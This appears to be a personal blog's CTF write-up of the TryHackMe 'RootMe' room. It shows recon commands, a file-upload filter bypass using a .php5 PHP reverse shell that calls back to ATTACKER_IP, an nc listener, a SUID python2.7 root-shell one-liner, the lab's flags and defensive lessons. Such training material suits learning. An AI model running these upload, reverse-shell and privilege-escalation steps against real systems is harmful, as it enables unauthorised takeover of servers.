<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RootMe CTF Writeup - 0xb0rn3</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-dark: #0a0a0a;
            --bg-secondary: #1a1a1a;
            --text-primary: #e0e0e0;
            --text-secondary: #a0a0a0;
            --accent-red: #ff3333;
            --accent-green: #00ff88;
            --accent-cyan: #00d4ff;
            --border-color: #333;
            --code-bg: #1e1e1e;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--bg-dark);
            color: var(--text-primary);
            line-height: 1.8;
        }

        nav {
            position: fixed;
            top: 0;
            width: 100%;
            background: rgba(10, 10, 10, 0.95);
            backdrop-filter: blur(10px);
            padding: 1.5rem 0;
            z-index: 1000;
            border-bottom: 1px solid var(--border-color);
        }

        nav ul {
            display: flex;
            justify-content: center;
            gap: 3rem;
            list-style: none;
        }

        nav a {
            color: var(--text-secondary);
            text-decoration: none;
            transition: color 0.3s;
        }

        nav a:hover {
            color: var(--accent-red);
        }

        article {
            max-width: 900px;
            margin: 100px auto 4rem;
            padding: 0 2rem;
        }

        .post-header {
            margin-bottom: 3rem;
            padding-bottom: 2rem;
            border-bottom: 2px solid var(--accent-red);
        }

        h1 {
            font-size: 2.5rem;
            color: var(--accent-red);
            margin-bottom: 1rem;
        }

        .post-meta {
            display: flex;
            gap: 2rem;
            color: var(--text-secondary);
            font-size: 0.9rem;
            flex-wrap: wrap;
        }

        .meta-item {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .badge {
            background: var(--accent-green);
            color: var(--bg-dark);
            padding: 0.2rem 0.6rem;
            border-radius: 4px;
            font-size: 0.8rem;
            font-weight: bold;
        }

        h2 {
            font-size: 1.8rem;
            color: var(--accent-cyan);
            margin: 2.5rem 0 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 1px solid var(--border-color);
        }

        h3 {
            font-size: 1.3rem;
            color: var(--accent-green);
            margin: 2rem 0 1rem;
        }

        p {
            margin-bottom: 1.2rem;
            color: var(--text-secondary);
        }

        code {
            background: var(--code-bg);
            padding: 0.2rem 0.5rem;
            border-radius: 3px;
            color: var(--accent-green);
            font-size: 0.9em;
        }

        pre {
            background: var(--code-bg);
            padding: 1.5rem;
            border-radius: 8px;
            overflow-x: auto;
            margin: 1.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        pre code {
            background: none;
            padding: 0;
            color: var(--text-primary);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 1.5rem 0;
            background: var(--bg-secondary);
        }

        th, td {
            padding: 1rem;
            text-align: left;
            border: 1px solid var(--border-color);
        }

        th {
            background: rgba(255, 51, 51, 0.1);
            color: var(--accent-red);
            font-weight: bold;
        }

        td {
            color: var(--text-secondary);
        }

        blockquote {
            background: rgba(0, 212, 255, 0.05);
            border-left: 4px solid var(--accent-cyan);
            padding: 1rem 1.5rem;
            margin: 1.5rem 0;
            color: var(--text-primary);
        }

        .attack-chain {
            background: var(--bg-secondary);
            padding: 2rem;
            border-radius: 8px;
            margin: 2rem 0;
            border: 1px solid var(--border-color);
        }

        .chain-step {
            display: flex;
            align-items: center;
            margin: 1rem 0;
            color: var(--text-secondary);
        }

        .chain-arrow {
            color: var(--accent-red);
            margin: 0 1rem;
            font-size: 1.5rem;
        }

        .flag-box {
            background: rgba(0, 255, 136, 0.1);
            border: 2px solid var(--accent-green);
            padding: 1rem;
            border-radius: 8px;
            margin: 1rem 0;
        }

        .flag-label {
            color: var(--accent-green);
            font-weight: bold;
            margin-bottom: 0.5rem;
        }

        .flag-value {
            color: var(--text-primary);
            font-family: monospace;
        }

        ul, ol {
            margin: 1rem 0 1rem 2rem;
            color: var(--text-secondary);
        }

        li {
            margin: 0.5rem 0;
        }

        .back-button {
            display: inline-block;
            padding: 0.8rem 1.5rem;
            background: var(--accent-red);
            color: white;
            text-decoration: none;
            border-radius: 4px;
            margin-top: 3rem;
            transition: all 0.3s;
        }

        .back-button:hover {
            background: #ff5555;
            transform: scale(1.05);
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 2rem;
            }
            
            nav ul {
                gap: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <nav>
        <ul>
            <li><a href="../index.html">Home</a></li>
            <li><a href="../main.html">Projects</a></li>
            <li><a href="../ctf.html">CTF</a></li>
            <li><a href="../blog.html">Blog</a></li>
            <li><a href="../contact.html">Contact</a></li>
        </ul>
    </nav>

    <article>
        <div class="post-header">
            <h1>RootMe - TryHackMe CTF Writeup</h1>
            <div class="post-meta">
                <div class="meta-item">
                    <span>üìÖ</span>
                    <span>February 16, 2026</span>
                </div>
                <div class="meta-item">
                    <span>üë§</span>
                    <span>oxbv1 | 0xb0rn3</span>
                </div>
                <div class="meta-item">
                    <span class="badge">TryHackMe</span>
                </div>
                <div class="meta-item">
                    <span class="badge" style="background: var(--accent-cyan);">Easy</span>
                </div>
            </div>
        </div>

        <section>
            <h2>Overview</h2>
            <p>
                RootMe is a beginner-friendly CTF challenge that tests fundamental web exploitation and Linux 
                privilege escalation skills. The attack chain involves reconnaissance, web directory enumeration, 
                file upload filter bypass, and SUID binary abuse for privilege escalation.
            </p>
        </section>

        <section>
            <h2>Phase 1: Reconnaissance</h2>
            
            <h3>Port Scanning & Service Detection</h3>
            <pre><code>nmap -sV -sC -p 80,443,8080 10.49.170.219</code></pre>

            <table>
                <thead>
                    <tr>
                        <th>Port</th>
                        <th>State</th>
                        <th>Service</th>
                        <th>Version</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>80</td>
                        <td>open</td>
                        <td>http</td>
                        <td>Apache httpd 2.4.41 (Ubuntu)</td>
                    </tr>
                    <tr>
                        <td>443</td>
                        <td>closed</td>
                        <td>https</td>
                        <td>-</td>
                    </tr>
                    <tr>
                        <td>8080</td>
                        <td>closed</td>
                        <td>http-proxy</td>
                        <td>-</td>
                    </tr>
                </tbody>
            </table>

            <p><strong>Key Findings:</strong></p>
            <ul>
                <li>Apache Version: <code>2.4.41 (Ubuntu)</code></li>
                <li>PHP is running (PHPSESSID cookie detected)</li>
                <li>Site title: "HackIT - Home" with prompt "Can you root me?"</li>
            </ul>

            <h3>HTTP Header Confirmation</h3>
            <pre><code>curl -sI http://10.49.170.219/</code></pre>
            
            <pre><code>HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=...; path=/
Content-Type: text/html; charset=UTF-8</code></pre>

            <blockquote>
                <strong>Answer:</strong> The Apache version running is <strong>2.4.41</strong>
            </blockquote>
        </section>

        <section>
            <h2>Phase 2: Directory Enumeration</h2>
            
            <h3>Gobuster Scan</h3>
            <pre><code>gobuster dir -u http://10.49.170.219/ -w /usr/share/dirb/wordlists/common.txt -t 10 --timeout 60s</code></pre>

            <table>
                <thead>
                    <tr>
                        <th>Path</th>
                        <th>Status</th>
                        <th>Description</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>/index.php</td>
                        <td>200</td>
                        <td>Main page</td>
                    </tr>
                    <tr>
                        <td>/css</td>
                        <td>301</td>
                        <td>Stylesheet directory</td>
                    </tr>
                    <tr>
                        <td>/js</td>
                        <td>301</td>
                        <td>JavaScript directory</td>
                    </tr>
                    <tr>
                        <td>/panel</td>
                        <td>301</td>
                        <td style="color: var(--accent-red);"><strong>Upload panel (hidden directory!)</strong></td>
                    </tr>
                    <tr>
                        <td>/uploads</td>
                        <td>301</td>
                        <td>Uploaded files directory</td>
                    </tr>
                    <tr>
                        <td>/server-status</td>
                        <td>403</td>
                        <td>Forbidden</td>
                    </tr>
                </tbody>
            </table>

            <blockquote>
                <strong>Answer:</strong> The hidden directory is <strong>/panel/</strong>
            </blockquote>
        </section>

        <section>
            <h2>Phase 3: Exploitation - File Upload Bypass</h2>
            
            <h3>Discovering the Upload Form</h3>
            <p>
                Navigating to <code>http://10.49.170.219/panel/</code> reveals a file upload form.
            </p>

            <h3>Testing the Filter</h3>
            <p>
                Attempting to upload a <code>.php</code> file returns:
            </p>
            <pre><code>PHP n√£o √© permitido!</code></pre>
            <p>Translation: "PHP is not allowed!" - The server blocks <code>.php</code> extensions.</p>

            <h3>Bypass Strategy</h3>
            <p>
                The filter only checks for the <code>.php</code> extension. Alternative PHP extensions 
                that Apache will still execute:
            </p>
            <ul>
                <li><code>.php5</code> (used successfully)</li>
                <li><code>.phtml</code></li>
                <li><code>.php3</code>, <code>.php4</code></li>
                <li><code>.phps</code></li>
            </ul>

            <h3>Crafting the Reverse Shell</h3>
            <p>Created a PHP reverse shell saved as <code>shell.php5</code>:</p>
            
            <pre><code>&lt;?php
set_time_limit(0);
$ip = 'ATTACKER_IP';
$port = 4444;
$shell = 'uname -a; w; id; /bin/bash -i';

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
// ... (full reverse shell code)
?&gt;</code></pre>

            <h3>Upload & Execution</h3>
            <pre><code># Upload the shell
curl -X POST -F "fileUpload=@shell.php5" -F "submit=Upload" http://10.49.170.219/panel/

# Start listener
nc -lvnp 4444

# Trigger the shell
curl http://10.49.170.219/uploads/shell.php5</code></pre>

            <p><strong>Result:</strong> Reverse shell received as <code>www-data</code></p>

            <h3>User Flag</h3>
            <pre><code>cat /var/www/user.txt</code></pre>

            <div class="flag-box">
                <div class="flag-label">üö© User Flag</div>
                <div class="flag-value">THM{y0u_g0t_a_sh3ll}</div>
            </div>
        </section>

        <section>
            <h2>Phase 4: Privilege Escalation</h2>
            
            <h3>SUID Binary Enumeration</h3>
            <pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>

            <p><strong>SUID binaries found:</strong></p>
            <pre><code>/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
<span style="color: var(--accent-red);">/usr/bin/python2.7    &lt;-- UNUSUAL!</span>
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec</code></pre>

            <blockquote>
                <strong>Answer:</strong> The weird SUID file is <strong>/usr/bin/python2.7</strong>
            </blockquote>

            <h3>Why is python2.7 SUID Dangerous?</h3>
            <p>
                Python with the SUID bit set allows any user to execute Python code with root privileges. 
                This is a critical misconfiguration because Python can directly manipulate process UIDs via 
                the <code>os</code> module.
            </p>
            <p>
                <strong>Reference:</strong> <a href="https://gtfobins.github.io/gtfobins/python/#suid" 
                style="color: var(--accent-cyan);" target="_blank">GTFOBins - Python SUID</a>
            </p>

            <h3>Exploitation</h3>
            <pre><code>python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code></pre>

            <p>This command:</p>
            <ol>
                <li><code>os.setuid(0)</code> - Sets the effective user ID to root (UID 0)</li>
                <li><code>os.system("/bin/bash")</code> - Spawns a root shell</li>
            </ol>

            <h3>Verification</h3>
            <pre><code>id
# uid=0(root) gid=33(www-data) groups=33(www-data)</code></pre>

            <h3>Root Flag</h3>
            <pre><code>cat /root/root.txt</code></pre>

            <div class="flag-box">
                <div class="flag-label">üö© Root Flag</div>
                <div class="flag-value">THM{pr1v1l3g3_3sc4l4t10n}</div>
            </div>
        </section>

        <section>
            <h2>Attack Chain Summary</h2>
            <div class="attack-chain">
                <div class="chain-step">
                    <span>üîç Reconnaissance</span>
                    <span class="chain-arrow">‚Üí</span>
                    <span>nmap -sV (Apache 2.4.41)</span>
                </div>
                <div class="chain-step">
                    <span>üìÇ Directory Enum</span>
                    <span class="chain-arrow">‚Üí</span>
                    <span>gobuster (/panel/ found)</span>
                </div>
                <div class="chain-step">
                    <span>üöÄ Upload Bypass</span>
                    <span class="chain-arrow">‚Üí</span>
                    <span>shell.php5 (filter bypassed)</span>
                </div>
                <div class="chain-step">
                    <span>üíª Web Shell</span>
                    <span class="chain-arrow">‚Üí</span>
                    <span>www-data access</span>
                </div>
                <div class="chain-step">
                    <span>üîß SUID Enum</span>
                    <span class="chain-arrow">‚Üí</span>
                    <span>python2.7 found</span>
                </div>
                <div class="chain-step">
                    <span>üëë Privesc</span>
                    <span class="chain-arrow">‚Üí</span>
                    <span>os.setuid(0) ‚Üí ROOT</span>
                </div>
            </div>
        </section>

        <section>
            <h2>Lessons Learned</h2>
            
            <ol>
                <li>
                    <strong>Never rely on extension-based file upload filtering alone.</strong> 
                    Blacklisting <code>.php</code> is easily bypassed with alternative extensions 
                    (<code>.php5</code>, <code>.phtml</code>). Use allowlisting and validate file 
                    content/MIME types instead.
                </li>
                <li>
                    <strong>SUID binaries should be audited regularly.</strong> Tools like 
                    <code>find / -perm -4000</code> reveal dangerous misconfigurations. Python, perl, 
                    and other interpreters should never have SUID set.
                </li>
                <li>
                    <strong>Principle of least privilege matters.</strong> The web server running as 
                    <code>www-data</code> with access to upload directories combined with SUID python 
                    created a direct path from anonymous web access to root.
                </li>
                <li>
                    <strong>Defense recommendations:</strong>
                    <ul>
                        <li>Implement allowlist-based upload filtering</li>
                        <li>Validate file content with magic bytes, not just extensions</li>
                        <li>Remove SUID bit from interpreters: <code>chmod u-s /usr/bin/python2.7</code></li>
                        <li>Use AppArmor/SELinux to restrict web server capabilities</li>
                        <li>Store uploads outside the webroot or disable PHP execution in upload directories</li>
                    </ul>
                </li>
            </ol>
        </section>

        <section>
            <h2>Tools Used</h2>
            <table>
                <thead>
                    <tr>
                        <th>Tool</th>
                        <th>Purpose</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>nmap</td>
                        <td>Port scanning & service detection</td>
                    </tr>
                    <tr>
                        <td>gobuster</td>
                        <td>Directory brute-forcing</td>
                    </tr>
                    <tr>
                        <td>curl</td>
                        <td>HTTP requests & file upload</td>
                    </tr>
                    <tr>
                        <td>nc</td>
                        <td>Reverse shell listener</td>
                    </tr>
                    <tr>
                        <td>python2.7</td>
                        <td>SUID privilege escalation</td>
                    </tr>
                </tbody>
            </table>
        </section>

        <a href="../ctf.html" class="back-button">‚Üê Back to CTF Projects</a>
    </article>
</body>
</html>
